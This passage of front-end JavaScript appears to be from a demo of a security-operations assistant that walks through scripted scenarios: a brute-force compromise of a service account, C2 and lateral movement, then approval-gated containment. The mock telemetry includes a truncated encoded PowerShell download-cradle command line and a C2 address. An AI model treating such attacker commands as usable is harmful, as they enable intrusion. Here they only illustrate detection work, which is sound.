      <button class="btn ${cfg.btn}" onclick="App.confirmAction('${a.kind}')">${ic(cfg.pic,15)} ${cfg.btnLabel}</button>
      <button class="btn ghost" onclick="App.closeRecAction()">Cancel</button>
    </div>
  </div>`;
}

/* ============================================================ INSPECTOR */
function renderObjectApp(c){
  const t=curThread();
  if(t.type==='chat'){
    c.innerHTML=`<div class="insp-empty">
      <span class="ill">${ic('sparkle',34)}</span>
      <h3>This is an ephemeral chat</h3>
      <p>Explore freely — nothing here is part of the official record yet. Promote it to grow a spine: status, evidence, timeline, and actions.</p>
      <button class="btn primary sm" onclick="App.requestPromote()">${ic('arrow',14)} Promote to a record</button>
    </div>`;
    return;
  }
  const tab=state.inspectorTab||'overview';
  const counts={evidence:(t.evidence||[]).length,actions:(t.actions||[]).length,people:1+(t.assignees||[]).length+(t.mentions||[]).length};
  const tabs=[['overview','Overview','doc'],['evidence','Evidence','link'],['timeline','Timeline','clock'],['actions','Actions','bolt'],['people','People','users']];
  let tb='';tabs.forEach(([k,l])=>{ const n=counts[k]; tb+=`<button class="${tab===k?'on':''}" onclick="App.setTab('${k}')">${l}${n?`<span class="cnt">${n}</span>`:''}</button>`; });
  c.innerHTML=`<div class="insp-tabs"><div class="insp-tabs-scroll">${tb}</div><button class="invite-btn insp-invite" title="Invite or assign — they see the full record" onclick="App.startInvite(event)">${ic('users',13)} Invite</button></div><div class="insp-body" id="inspBody"></div>`;
  renderInspBody(tab,t);
}
/* ---- Entity impact map — affected assets & spread on the record overview (Scenario 4) ---- */
function impactMapSection(t){
  const im=t.impact; if(!im||!im.stages||!im.stages.length) return '';
  const node=n=>`<div class="imp-node"><span class="imp-dot ${n[3]}"></span><div class="imp-node-b"><div class="imp-node-n">${n[1]}</div><div class="imp-node-m">${n[2]}</div></div><span class="imp-tag ${n[3]}">${n[4]}</span></div>`;
  const stage=s=>`<div class="imp-stage"><span class="imp-stage-k">${s.k}</span>${s.nodes.map(node).join('')}</div>`;
  return `<section class="bsec"><div class="bsec-h"><div class="bf-status"><h4>Impact map</h4></div></div>
    <div class="imp-map"><div class="imp-flow">${im.stages.map(stage).join('')}</div></div></section>`;
}
function renderInspBody(tab,t){
  const b=$('#inspBody');let h='';
  if(tab==='overview'){
    initBrief(t);
    if(t.brief.versions.length===0 && !t.brief.generating){ t.brief.versions.push({v:1,ts:Date.now(),label:'Record opened',html:buildBrief(t)}); }
    const bs=t.brief; const last=bs.versions.length-1;
    const viewingPast = bs.viewing!=null && bs.viewing<last;
    const shown = bs.viewing!=null ? bs.versions[bs.viewing] : bs.versions[last];
    h+=assessmentSection(t);
    h+=inspProgressSection(t);
    h+=impactMapSection(t);
    if(bs.generating && bs.versions.length===0){ h+=`<div class="brief-assembling"><span class="dots"><i></i><i></i><i></i></span> Assembling the brief from this thread…</div>`; }
    else {
      if(viewingPast) h+=`<div class="brief-snap-banner">${ic('clock',13)} Viewing v${shown.v} of ${bs.versions[last].v} · ${shown.label} <button onclick="App.briefLatest()">Back to latest</button></div>`;
      h+=`<div class="brief-doc${bs.generating?' regen':''}" id="briefDoc">${shown?shown.html:''}</div>`;
    }
    b.innerHTML=h; return;
  }
  if(tab==='evidence'){
    (t.evidence||[]).forEach((e,i)=>{
      const liveCls=e.liveGood===false?'':'';const liveColor=e.liveGood===false?'var(--red-d)':'var(--green)';
      h+=`<div class="evcard" id="ecard-${e.id||i}">
        <div class="ech"><span class="enum">${i+1}</span><span class="ett">${e.t}</span><span style="color:var(--ink-3)">${ic(e.icon,15)}</span></div>
        <div class="meta-grid">
          <div class="mg"><span class="ml">Source</span><span class="mv">${e.src}</span></div>
          <div class="mg"><span class="ml">Field</span><span class="mv mono">${e.mv}</span></div>
        </div>
        <div class="snap" style="margin-top:8px">${e.snap.replace(/\n/g,'<br>')}</div>
        <div class="liverow">
          <span class="livebadge" style="${e.liveGood===false?'color:var(--red-d);background:var(--red-bg)':''}"><span class="live-dot" style="background:${liveColor}"></span> live: ${e.live}</span>
          <span class="rerun" onclick="App.toast('info','Re-running query','Provenance link → current state.')">${ic('refresh',12)} re-run query</span>
        </div>
        <div class="why">${e.why}</div>
      </div>`;
    });
  }
  if(tab==='timeline'){
    h+=`<div class="tl" style="padding-left:8px">`;
    (t.timeline||[]).forEach(r=>{ h+=`<div class="tl-row ${r.cls}"><span class="tdot"></span><span class="ttime">${r.time}</span><span class="ttxt">${r.txt}</span></div>`; });
    h+=`</div>`;
  }
  if(tab==='actions'){
    if((t.actions||[]).length){ (t.actions).forEach(a=>{ h+=actionLogCard(a); }); }
    else h+=`<p style="color:var(--ink-3);font-size:12.5px;padding:4px 0 12px">No actions taken yet.</p>`;
    // available actions
    if(t.mode==='dayshift'){
      const off=t.isDayCase; const isolating=t.status==='in-progress' && /isolat/i.test(t.title||'');
      h+=`<div class="avail"><h5>Available — gated by your permissions</h5>
        ${isolating?availBtn('x','Cancel isolation — running now',()=>"App.recStub('Cancel isolation')"):availBtn('lock','Network-isolate a host',()=>off?"App.startAction('isolate')":"App.recStub('Network-isolate a host')")}
        ${availBtn('userx','Disable an account',()=>off?"App.startAction('disable')":"App.recStub('Disable an account')")}
        ${t.type!=='incident'?availBtn('siren','Convert to Incident',()=>off?"App.startAction('incident')":"App.recStub('Convert to Incident')"):''}
      </div>`;
    }else{
      const off=t.isNightCase;
      h+=`<div class="avail"><h5>Available — gated by your permissions</h5>
        ${availBtn('rotate','Roll back deploy',()=>off?"App.startAction('rollback')":"App.recStub('Roll back deploy')")}
      </div>`;
    }
  }
  if(tab==='people'){
    h+=person(t.owner,'owner');
    (t.assignees||[]).forEach(p=>h+=person(p,'assignee'));
    (t.mentions||[]).forEach(p=>h+=person(p,'ment'));
    h+=`<button class="add-person" onclick="App.startAssign(event)">${ic('plus',14)} Invite or assign</button>`;
  }
  b.innerHTML=h;
}
function kv(k,v){return `<div class="kv"><span class="k">${k}</span><span class="v">${v}</span></div>`;}
function availBtn(icn,label,fn){return `<button class="avail-btn" onclick="${fn()}"><span class="abi">${ic(icn,15)}</span> ${label} <span class="lk" style="color:var(--ink-4)">${ic('arrow',13)}</span></button>`;}
function person(pid,role){const p=PEOPLE[pid];const rl={owner:'Owner',assignee:'Assignee',ment:'Mentioned',agent:'Agent'}[role];
  return `<div class="person">${avatar(pid)}<div class="pmeta"><div class="pn">${p.name} ${p.agent?`<span style="color:var(--accent-d)">${ic('sparkle',12)}</span>`:''}</div><div class="pr">${p.role}</div></div><span class="ptag ${role}">${rl}</span></div>`;}
function actionLogCard(a){
  const cfg={isolate:{i:'lock',c:'var(--red)'},disable:{i:'userx',c:'var(--red)'},rollback:{i:'rotate',c:'var(--blue)'},incident:{i:'siren',c:'var(--t-incident)'}}[a.kind]||{i:'bolt',c:'var(--blue)'};
  return `<div class="actcard"><span class="ai" style="background:${cfg.c}">${ic(cfg.i,15)}</span>
    <div class="ab"><div class="at">${a.title}</div><div class="ad">${a.sub}</div>
      <div class="ameta"><span class="st ${a.status==='proposed'?'prop':'done'}">${a.status||'done'}</span> ${ic('clock',11)} ${a.time} · by ${PEOPLE[a.by].name}</div>
      ${a.reversible?`<div class="undo">${ic('refresh',12)} Reverse this action</div>`:''}
    </div></div>`;
}

/* ============================================================ COMPOSER + SUGGESTIONS */
function renderSuggest(){
  const wrap=$('#suggest');const t=curThread();
  wrap.innerHTML='';
  (t.suggestions||[]).forEach((s,i)=>{
    const node=el(`<button class="sg ${s.act?'act':''}" style="animation-delay:${i*60}ms">${s.icon?ic(s.icon,13):''}<span class="sg-ic"></span>${s.label}</button>`);
    node.onclick=s.fn;
    wrap.appendChild(node);
  });
}
function setSuggestions(arr){ curThread().suggestions=arr; renderSuggest(); }
function clearSuggestions(){ setSuggestions([]); }

/* ============================================================ MESSAGE FLOW */
function pushMsg(m){ curThread().messages.push(m); renderStream(); }
function scrollBottom(){ const s=$('#stream'); requestAnimationFrame(()=>{ s.scrollTop=s.scrollHeight; }); }
function thinking(label,cb,delay=750){
  clearSuggestions();
  const wrap=$('#streamIn');
  const node=el(`<div class="thinking"><span class="who agent-who">${ic(state.mode==='nightshift'?'moon':'sun',16)}</span><div class="body"><span class="dots"><i></i><i></i><i></i></span> ${label}</div></div>`);
  wrap.appendChild(node);scrollBottom();
  setTimeout(()=>{ node.remove(); cb(); }, delay);
}

/* ============================================================ DAYSHIFT SCRIPT */
const dayBeats=[
  { user:"I'm seeing a spike in failed logins across the finance subnet over the last 24h. What's going on?",
    think:"Querying authentication failures across the finance subnet…",
    play(){
      pushMsg({role:'agent',tool:{ icon:'db',label:'Discover · authentication events',
        query:'event.category:"authentication" AND event.outcome:"failure"\nAND host.network:"finance"  window 24h',
        result:`<div class="res-stat">
          <div class="stat"><div class="v red">312</div><div class="k">failed logons</div></div>
          <div class="stat"><div class="v">4</div><div class="k">hosts</div></div>
          <div class="stat"><div class="v amber">1</div><div class="k">success after burst</div></div>
        </div>
        <table class="res" style="margin-top:10px"><tr><th>Host</th><th>Failures</th><th></th><th>Then</th></tr>
        <tr><td class="hostflag">${ic('host',12)} FIN-WS-04</td><td class="mono">247</td><td><span class="bar"><i style="width:100%"></i></span></td><td class="mono" style="color:var(--red-d)">1 success 02:41</td></tr>
        <tr><td class="mono">FIN-WS-11</td><td class="mono">38</td><td><span class="bar"><i style="width:16%;background:var(--ink-4)"></i></span></td><td>—</td></tr>
        <tr><td class="mono">FIN-WS-02</td><td class="mono">19</td><td><span class="bar"><i style="width:8%;background:var(--ink-4)"></i></span></td><td>—</td></tr>
        <tr><td class="mono">FIN-PRT-01</td><td class="mono">8</td><td><span class="bar"><i style="width:4%;background:var(--ink-4)"></i></span></td><td>—</td></tr></table>`}});
      pushMsg({role:'agent',name:false,prose:`One host dominates: <b>FIN-WS-04</b> took <b>247</b> failures over 23 minutes, then a <span class="flag">single successful logon at 02:41 UTC</span>. The success used the service account <code>svc-backup</code> — which by policy is <b>non-interactive</b>. That combination (brute force → success on a service account) is a strong credential-compromise signal.`});
      setSuggestions([
        {label:"What did svc-backup do after logging in?",icon:'terminal',fn:()=>nextDay()},
        {label:"Show svc-backup's normal behavior",icon:'user',fn:()=>nextDay()},
        {label:"Is FIN-WS-04 patched?",icon:'host',fn:()=>nextDay()},
      ]);
    }},
  { user:"What did svc-backup do after that successful login on FIN-WS-04?",
    think:"Pulling process and network telemetry from FIN-WS-04 post-02:41…",
    play(){
      pushMsg({role:'agent',tool:{ icon:'terminal',label:'Endpoint · process + network (FIN-WS-04)',
        query:'host.name:"FIN-WS-04" AND user.name:"svc-backup"\nAND @timestamp >= now-7h',
        result:`<div class="ptree">
          <div>services.exe <span style="color:var(--ink-4)">(svc-backup)</span></div>
          <div class="lvl danger">powershell.exe -enc <span class="ext">aQBlAHgA…</span>  →  download cradle</div>
          <div class="lvl danger" style="padding-left:36px">↳ outbound TCP <span class="ext">45.137.x.x:443</span>  <span style="color:var(--ink-4)">(14 conns / 6 min · no history)</span></div>
          <div class="lvl danger" style="padding-left:36px">↳ SMB 445 → <span class="ext">FIN-DC-01</span>  <span style="color:var(--red-d)">(auth failed)</span></div>
        </div>`}});
      pushMsg({role:'agent',name:false,prose:`This is the full kill-chain shape: the compromised session ran an <b>obfuscated PowerShell download cradle</b>, opened <span class="flag">outbound C2</span> to a rare external host, then tried to <span class="flag">pivot via SMB to the domain controller FIN-DC-01</span> — that attempt failed. Assessment: active credential compromise with attempted lateral movement. I'd <b>escalate this now</b>.`});
      setSuggestions([
        {label:"Escalate this",icon:'arrow',act:true,fn:()=>nextDay()},
        {label:"Was FIN-DC-01 compromised?",icon:'host',fn:()=>nextDay()},
        {label:"Who owns svc-backup?",icon:'user',fn:()=>nextDay()},
      ]);
    }},
  { user:"Yeah, this is real. Escalate it.",
    think:null,
    play(){
      pushMsg({role:'agent',prose:`Agreed — let's make it official. Pick a type and I'll assemble the record from everything we've found. <b>The thread stays exactly as-is</b>; it just grows a spine.`});
      pushMsg({role:'agent',name:false,promote:true});
      // promote picker has its own buttons; no suggestions
    }},
];
function nextDay(userText){
  const t=curThread();
  const beat=dayBeats[state.dayStep];
  if(!beat) return;
  pushMsg({role:'user',text:userText||beat.user});
  state.dayStep++;
  if(beat.think){ thinking(beat.think, ()=>beat.play(), 850); }
  else { setTimeout(()=>beat.play(), 250); }
}

/* ============================================================ PROMOTION → RECORD */
function promoteTo(type){
  // remove the promote card by re-rendering without it: mark consumed
  const t=curThread();
  // strip the promote message
  t.messages=t.messages.filter(m=>!m.promote);
  renderStream();
  thinking(`Assembling ${TYPE_META[type].label.toLowerCase()} from 3 queries and 6 artifacts…`, ()=>{
    pushMsg({role:'agent',proposal:{type}});
  }, 1100);
}
function approveRecord(type){
  const t=curThread();
  t.messages=t.messages.filter(m=>!m.proposal);
  // build the spine
  t.type=type;
  t.recordId = {case:'CASE-2056',incident:'INC-2056',investigation:'INV-2056',hunt:'HUNT-2056',custom:'REC-2056'}[type];
  t.status='open'; t.severity='High'; t.owner='you';
  t.isDayCase=true; /* the official FIN-WS-04 case — generic FIN-WS-04/svc-backup fallbacks apply only here */
  t.title='Credential compromise: svc-backup → C2 → lateral movement (FIN-WS-04)';
  t.evidence=JSON.parse(JSON.stringify(DAY_EVIDENCE));
  t.timeline=JSON.parse(JSON.stringify(DAY_TIMELINE)).concat([{time:nowHM(),cls:'now',txt:`<b>Escalated by you</b> → ${t.recordId} created`}]);
  t.mitre=DAY_MITRE.slice();
  t.narrative=DAY_NARRATIVE+` <b>Containment in progress.</b>`;
  t.actions=[]; t.mentions=[]; // keep t.assignees — collaborators invited during the chat carry over
  // seed the brief (hero narrative + open questions + assessment)
  t.situation=`A brute-force run against the finance subnet ended in a single successful logon to FIN-WS-04 at 02:41 UTC using <code>svc-backup</code> — a service account that is non-interactive by policy. The session immediately launched an encoded PowerShell download cradle, opened outbound C2 to a rare external host (45.137.x.x), and tried to pivot to the domain controller FIN-DC-01 over SMB. The pivot failed. The shape — credential abuse, C2, attempted lateral movement — points to an active intrusion, not a misconfiguration.`;
  t.questions=['Did <code>svc-backup</code> authenticate anywhere else inside the burst window?','Was the SMB attempt on FIN-DC-01 truly unsuccessful, or only logged as failed?','Is this isolated to FIN-WS-04, or are peer finance hosts affected?','How were the svc-backup credentials obtained — phishing, a leaked secret, or reuse?'];
  t.assessment='Active credential compromise on FIN-WS-04 with attempted lateral movement to FIN-DC-01. Not yet contained.'; t.assessmentTone='warn';
  if(type==='incident'){ t.commander='maya'; }
  renderNav(); renderSpine();
  pushMsg({role:'system',evt:type,text:`${TYPE_META[type].label} created from this thread`,id:t.recordId});
  // open inspector and assemble the brief (animated — the hero moment)
  initBrief(t); regenBrief(t,'Case opened');
  state.inspectorOpen=true; state.inspectorTab='overview'; if(!state.panelApps.includes('object')) state.panelApps.unshift('object'); state.activeApp='object'; renderInspector();
  toast('ok',`${t.recordId} created`,`Spine assembled · 6 evidence items · live brief`);
  setTimeout(()=>{
    pushMsg({role:'agent',prose:`Done — <b>${t.recordId}</b> is live, and everything we found is attached with provenance. I’m assembling the <b>brief</b> now — it’ll keep itself current as the investigation moves. Want me to recommend containment?`});
    setSuggestions([
      {label:"Isolate FIN-WS-04",icon:'lock',act:true,fn:()=>startAction('isolate')},
      {label:"Disable svc-backup",icon:'userx',fn:()=>startAction('disable')},
      {label:"Form a hypothesis",icon:'investigation',fn:()=>formHypothesis()},
      {label:"Convert to Incident",icon:'siren',fn:()=>startAction('incident')},
    ]);
  },700);
}

/* ============================================================ ACTIONS */
/* ============================================================ FLOW 2 — cfo@corp / CASE-2047: needs your call · takes questions · contains */
function cfoThread(){ return state.threads['day-r3']; }
function cfoRefreshBrief(t){ initBrief(t); const vs=t.brief.versions; const html=buildBrief(t); if(vs.length){ vs[vs.length-1].html=html; } else { vs.push({v:1,ts:Date.now(),label:'Case opened',html}); } if(state.inspectorOpen && curThread()===t) renderInspector(); }
function cfoChips(){
  const t=cfoThread(); if(!t) return;
  const qa=t.qa||[]; const remaining=qa.filter(x=>!x.answered); const answered=qa.length-remaining.length;
  const chips=[];
  if(!t._contained){
    const canContain = answered>=2 || ((qa.find(x=>x.id==='q-activity')||{}).answered);
    if(canContain) chips.push({label:'Revoke active sessions',icon:'lock',act:true,fn:()=>cfoContain()});
  }
  remaining.slice(0,3).forEach(x=>chips.push({label:x.chip||x.q,icon:'investigation',qid:x.id,fn:()=>cfoAsk(x.id)}));
  if(t._contained) chips.push({label:'Back to the Brief',icon:'sparkle',fn:()=>App.setNavView('brief')});
  setSuggestions(chips);
}
function cfoInit(){ const t=cfoThread(); if(!t) return; if(!t.answered) t.answered=[]; t._walkStarted=true; cfoChips(); }
function cfoAsk(id, opts){
  const t=cfoThread(); if(!t) return;
  const qa=(t.qa||[]).find(x=>x.id===id); if(!qa) return;
  const typed=opts&&opts.typed;
  pushMsg({role:'user',text: typed || qa.q});
  clearSuggestions();
  const ev=evById(t,qa.evId);
  thinking('Pulling the evidence…', ()=>{
    qa.answered=true;
    if(!t.answered) t.answered=[];
    if(!t.answered.find(a=>a.id===id)) t.answered.push({id, q:qa.q, evId:qa.evId});
    const hy=(t.hypotheses||[])[0];
    if(hy && ['q-travel','q-mfa'].every(nid=>((t.qa.find(x=>x.id===nid))||{}).answered) && hy.state!=='confirmed'){ hy.state='confirmed'; hy.confidence='high'; hy.forIds=['ev-travel','ev-token','ev-asn']; }
    pushMsg({role:'agent',name:false,prose:qa.answer, cite: ev?{evId:qa.evId, src:shortSrc(ev.src)}:null});
    cfoRefreshBrief(t);
    cfoChips();
  }, 820);
}
function cfoContain(){
  const t=cfoThread(); if(!t||t._contained) return;
  clearSuggestions();
  pushMsg({role:'user',text:'Revoke the active sessions.'});
  pushMsg({role:'agent',prose:`This one changes the world, so I need your sign-off. Here's exactly what revoking <b>cfo@corp</b>'s sessions touches:`});
  pushMsg({role:'agent',name:false,gate:{kind:'revoke'}});
}
function cfoRevoke(){
  const t=cfoThread(); if(!t||t._contained) return;
  t._contained=true;
  t.handled=true;
  t._resolvedTrail=buildResolvedTrail(t,{label:'Revoke active sessions',done:'Sessions revoked — 3 active tokens killed across Okta + M365. MFA re-enrollment forced.',permNote:'Senior Analyst · identity actions permitted'});
  t.messages=t.messages.filter(m=>!m.gate);
  t.actions=t.actions||[]; t.actions.unshift({kind:'revoke',title:'Revoked active sessions — cfo@corp',sub:'3 sessions across Okta + M365 · MFA re-enroll forced',status:'done',time:'now',by:'you',reversible:true});
  t.status='contained';
  t.assessment=`Contained — 3 sessions revoked across Okta + M365 and MFA re-enrollment forced. Session-token theft on cfo@corp, caught before mail was forwarded.`; t.assessmentTone='ok';
  t.callout={tone:'ok',icon:'check',text:`Contained — sessions revoked and the forwarding rule removed. Monitoring cfo@corp for re-auth from the flagged ASN.`};
  t.recActions=[ {label:'Force password + MFA reset',icon:'shield',gated:true}, {label:'Hunt this token-theft pattern across other execs',icon:'target',gated:false}, {label:'Assign to IR',icon:'users',gated:false} ];
  t.timeline=(t.timeline||[]).filter(r=>r.cls!=='now').concat([
    {time:'now',cls:'act',txt:'<b>Sessions revoked</b> — 3 tokens killed across Okta + M365'},
    {time:'now',cls:'now',txt:'<b>Contained</b> — MFA re-enrollment forced; 24h monitoring on'},
  ]);
  renderStream(); renderNav(); renderSpine();
  pushMsg({role:'system',evt:'isolate',text:'Sessions revoked for cfo@corp',id:'CASE-2047'});
  toast('ok','Sessions revoked','3 tokens killed across Okta + M365 · MFA re-enroll forced');
  cfoRefreshBrief(t);
  setTimeout(()=>{
    pushMsg({role:'agent',prose:`Done — every live session for <b>cfo@corp</b> is killed and MFA re-enrollment is forced. The forwarding rule is removed. Status is now <b>Contained</b>.`});
    pushMsg({role:'agent',name:false,resolved:{ id:'CASE-2047',
      stats:[['3m 48s','Time to contain'],['3','Sessions revoked'],['0 sent','Mail exfil prevented'],['24h','Monitoring window']],
      note:`Reversible — the CFO signs back in and re-enrolls MFA. Dark Watch is watching for re-auth from AS20473.` }});
    cfoChips();
    setTimeout(()=>{ App.archiveRecord('day-r3', {title:'Contained — filed to Records', msg:(t.recordId||'Record')+' closed with its evidence trail. Find it anytime in Records.'}); }, 1400);
  }, 680);
}
function cfoCancelGate(){
  const t=cfoThread(); if(!t) return;
  t.messages=t.messages.filter(m=>!m.gate);
  renderStream();
  pushMsg({role:'agent',name:false,prose:`Holding off — the sessions are still live. Ask me anything else, or say the word when you want to revoke.`});
  cfoChips();
}
function approvalSheet(g){
  const a=((AI_RADAR['day-r3']||{}).actions||[]).find(x=>x.gated)||{};
  const blast=a.blast||[];
  let rows=''; blast.forEach(b=>{ const ok=b[2]==='ok'; rows+=`<div class="gate-br ${ok?'ok':''}"><span class="gbi">${ic(ok?'check':(b[0]||'warn'),14)}</span><span>${b[1]}</span>${ok?`<span class="gb-ok">${ic('check',11)} safe</span>`:''}</div>`; });
  const t=cfoThread(); const allowOn=!!(t&&t._allowRevoke);
  return `<div class="msg-full"><div class="gate">
    <div class="gate-top"><span class="gate-ic">${ic('lock',15)}</span>
      <div class="gate-h"><div class="gate-k">Approval required · world-changing action</div><div class="gate-t">Revoke active sessions — cfo@corp</div></div>
      <span class="gate-id">CASE-2047</span></div>
    <div class="gate-body">
      <div class="gate-lbl">Blast radius</div>
      <div class="gate-blast">${rows}</div>
      <div class="gate-perm">${ic('shield',13)}<span><b>You</b> — Senior Analyst · identity actions permitted</span></div>
    </div>
    <div class="gate-allow"><span class="gate-cb ${allowOn?'on':''}" onclick="App.cfoAllowToggle()">${ic('check',12)}</span><span>Always allow <b>session revocation</b> in this case — stop asking</span></div>
    <div class="gate-acts">
      <button class="gate-yes" onclick="App.cfoConfirmRevoke()">${ic('lock',15)} Revoke sessions</button>
      <button class="gate-no" onclick="App.cfoCancelGate()">Cancel</button>
    </div>
  </div></div>`;
}
function resolvedCard(r){
  let stats=''; (r.stats||[]).forEach(s=>{ stats+=`<div class="rcard-stat"><div class="rcard-v">${s[0]}</div><div class="rcard-k">${s[1]}</div></div>`; });
  return `<div class="msg-full"><div class="rcard">
    <div class="rcard-top"><span class="rcard-badge">${ic('check',13)} Contained</span><span class="rcard-id">${r.id}</span></div>
    <div class="rcard-stats">${stats}</div>
    ${r.note?`<div class="rcard-foot">${ic('refresh',14)}<span>${r.note}</span></div>`:''}
  </div></div>`;
}
function citeTag(c){ return `<button class="cite-tag" onclick="App.gotoEvidence('${c.evId}')" title="View the source evidence">${ic('link',12)} Evidence <span class="cite-src">· ${c.src}</span> ${ic('arrow',11)}</button>`; }
const CFO_KW={ 'q-travel':['travel','traveling','travelling','vpn','abroad','trip','flight'], 'q-mfa':['mfa','prompt','challenge','2fa','otp','multifactor','reprompt'], 'q-blast':['blast','radius','exposed','impact','scope','reach'], 'q-activity':['activity','done','anything','rule','forward','forwarding','mailbox','exfil'] };
function normQ(s){ return String(s||'').toLowerCase().replace(/[^a-z0-9 ]/g,' ').replace(/\s+/g,' ').trim(); }
function matchSuggestion(v, sug){
  const nv=normQ(v); if(!nv || !sug || !sug.length) return null;
  const vw=nv.split(' ').filter(w=>w.length>2); if(!vw.length) return null;
  // pass 1 — direct label word-overlap: a verbatim action like "revoke the sessions" wins here, before any keyword intent
  let best=null, bestScore=0;
  sug.forEach(s=>{
    const label=normQ(s.label); const lw=label.split(' ').filter(w=>w.length>2);
    let overlap=0; vw.forEach(w=>{ if(lw.indexOf(w)>=0) overlap++; });
    let score=overlap/Math.max(3, Math.min(vw.length, lw.length)||1);
    if(label && (label.indexOf(nv)>=0 || nv.indexOf(label)>=0)) score=Math.max(score,0.9);
    if(score>bestScore){ bestScore=score; best=s; }
  });
  if(bestScore>=0.6) return best;
  // pass 2 — keyword intent boost for question chips, only when no strong direct match
  sug.forEach(s=>{ if(!s.qid) return; (CFO_KW[s.qid]||[]).forEach(k=>{ if(nv.indexOf(k)>=0 && bestScore<0.8){ bestScore=0.8; best=s; } }); });
  return bestScore>=0.34 ? best : null;
}
function bestCfoQuestion(v){
  const t=cfoThread(); if(!t) return null;
  const nv=normQ(v); const open=(t.qa||[]).filter(x=>!x.answered);
  for(const x of open){ if((CFO_KW[x.id]||[]).some(k=>nv.indexOf(k)>=0)) return x; }
  return null;
}

/* ============================================================ ACTIONS */
function startAction(kind){
  // if allow-list already granted for isolate, skip confirm
  if(kind==='isolate' && state.allowIsolate){ confirmAction('isolate',true); return; }
  clearSuggestions();
  pushMsg({role:'agent',prose:actionPrompt(kind)});
  pushMsg({role:'agent',name:false,action:{kind}});
}
function actionPrompt(kind){
  return {
    isolate:`Here's the containment action. This one changes the world, so I need your confirmation — here's exactly what it touches:`,
    disable:`I can disable the compromised account. Reviewing the blast radius:`,
    rollback:`I can execute the remediation. Here's what rolling back will do:`,
    incident:`I can escalate this case to a coordinated incident. Here's what changes:`,
  }[kind];
}
function confirmAction(kind,skipped){
  const t=curThread();
  t.messages=t.messages.filter(m=>!m.action);
  if(kind==='isolate'){
    t.status='contained';
    t.actions.unshift({kind:'isolate',title:'FIN-WS-04 network-isolated',sub:'Session frozen for forensics',time:nowHM(),by:'you',reversible:true});
    t.timeline.push({time:nowHM(),cls:'act',txt:'<b>FIN-WS-04 isolated</b> (reversible) by you'});
    t.narrative=DAY_NARRATIVE+` <b>FIN-WS-04 isolated at ${nowHM()}</b> — session frozen for forensics.`;
    renderSpine();renderInspector();
    refreshDayAssessment(t); regenBrief(t,'Action: FIN-WS-04 isolated');
    pushMsg({role:'system',evt:'isolate',text:'FIN-WS-04 network-isolated'});
    toast('ok','FIN-WS-04 isolated',skipped?'Auto-approved via your allow-list for this case':'Host contained · session frozen · reversible');
    setTimeout(()=>{ pushMsg({role:'agent',prose:`FIN-WS-04 is isolated and the session is frozen. Status moved to <b>Contained</b>. Next steps?`});
      setSuggestions([
        {label:"Disable svc-backup",icon:'userx',fn:()=>startAction('disable')},
        {label:"Assign to Maya Chen (IR)",icon:'users',fn:()=>startAssign()},
        {label:"Convert to Incident",icon:'siren',fn:()=>startAction('incident')},
      ]);
    },650);
  }
  if(kind==='disable'){
    t.actions.unshift({kind:'disable',title:'svc-backup disabled',sub:'Directory-wide',time:nowHM(),by:'you',reversible:true});
    t.timeline.push({time:nowHM(),cls:'act',txt:'<b>svc-backup disabled</b> by you'});
    renderInspector();
    refreshDayAssessment(t); regenBrief(t,'Action: svc-backup disabled');
    pushMsg({role:'system',evt:'action',text:'Account svc-backup disabled'});
    toast('ok','svc-backup disabled','Credential revoked · reversible');
    setTimeout(()=>{ pushMsg({role:'agent',prose:`Account disabled. The attacker's foothold is cut. Want to loop in IR or draft an exec summary?`});
      setSuggestions([
        {label:"Assign to Maya Chen (IR)",icon:'users',fn:()=>startAssign()},
        {label:"Convert to Incident",icon:'siren',fn:()=>startAction('incident')},
      ]);
    },650);
  }
  if(kind==='incident'){
    t.type='incident'; t.recordId='INC-2056'; t.commander='maya'; t.severity='Critical';
    if(t.assignees.indexOf('maya')<0) t.assignees.push('maya');
    t.timeline.push({time:nowHM(),cls:'crit',txt:'<b>Escalated to Incident</b> — IR commander paged'});
    t.narrative=t.narrative+` <b>Escalated to a coordinated incident; war room open.</b>`;
    renderNav();renderSpine();renderInspector();
    regenBrief(t,'Status: escalated to Incident');
    pushMsg({role:'system',evt:'incident',text:'Escalated to Incident · war room open',id:'INC-2056'});
    toast('warn','Incident declared','INC-2056 · IR commander paged · war room open');
    setTimeout(()=>{ pushMsg({role:'agent',prose:`This is now <b>INC-2056</b>. Maya Chen is paged as commander, the war room is open, and every collaborator inherits the full thread and evidence — no re-briefing. The same conversation just gained command structure.`});
      setSuggestions([{label:"Draft stakeholder comms",icon:'doc',fn:()=>draftComms()},{label:"Done for now",icon:'check',fn:()=>clearSuggestions()}]);
    },650);
  }
  if(kind==='rollback'){
    t.status='in-progress';
    t.actions.unshift({kind:'rollback',title:'checkout-service rolled back → v2.8.0',sub:'3 pods, rolling restart',time:nowHM(),by:'you',reversible:true});
    t.timeline.push({time:nowHM(),cls:'act',txt:'<b>Rollback to v2.8.0</b> approved by you'});
    t.narrative=NIGHT_NARRATIVE.replace('Awaiting your review.','<b>Rollback approved — recovering.</b>');
    renderSpine();renderInspector();
    t.assessment='Rollback executed — checkout-service on v2.8.0, p99 recovering toward 180ms.'; t.assessmentTone='ok';
    regenBrief(t,'Action: rollback to v2.8.0');
    pushMsg({role:'system',evt:'rollback',text:'checkout-service rolled back to v2.8.0'});
    toast('ok','Rollback executed','checkout-service → v2.8.0 · p99 recovering');
    setTimeout(()=>{ pushMsg({role:'agent',prose:`Rollback is live — p99 already dropping back toward 180ms. I'll keep watching and close this out if it holds. Want me to file a follow-up to re-add the index hint before v2.8.1 ships again?`});
      setSuggestions([{label:"Adopt as official investigation",icon:'check',fn:()=>adoptInvestigation()},{label:"File the follow-up",icon:'doc',fn:()=>App.toast('info','Follow-up filed','Linked to this investigation.')}]);
    },650);
  }
}
function draftComms(){ clearSuggestions(); toast('info','Drafting comms','Stakeholder update prepared in the war room.'); pushMsg({role:'agent',prose:`Drafted a stakeholder update from the live narrative — concise status, impact, and current containment. It's in the war room for your review before it goes out.`}); }

/* ============================================================ ASSIGN / MENTION */
function peoplePicker(ev, onPick, exclude){
  const candidates=['maya','tom','priya'].filter(p=>!(exclude||[]).includes(p));
  const pop=el(`<div class="picker-pop"></div>`);
  if(!candidates.length) pop.appendChild(el(`<div class="pp-empty">Everyone’s already in this thread.</div>`));
  candidates.forEach(pid=>{const p=PEOPLE[pid];
    const row=el(`<div class="pp-row">${avatar(pid)}<div><div class="pp-n">${p.name}</div><div class="pp-r">${p.role}</div></div></div>`);
    row.onclick=()=>{ onPick(pid); pop.remove(); };
    pop.appendChild(row);
  });
  document.body.appendChild(pop);
  let x=window.innerWidth/2, y=window.innerHeight/2;
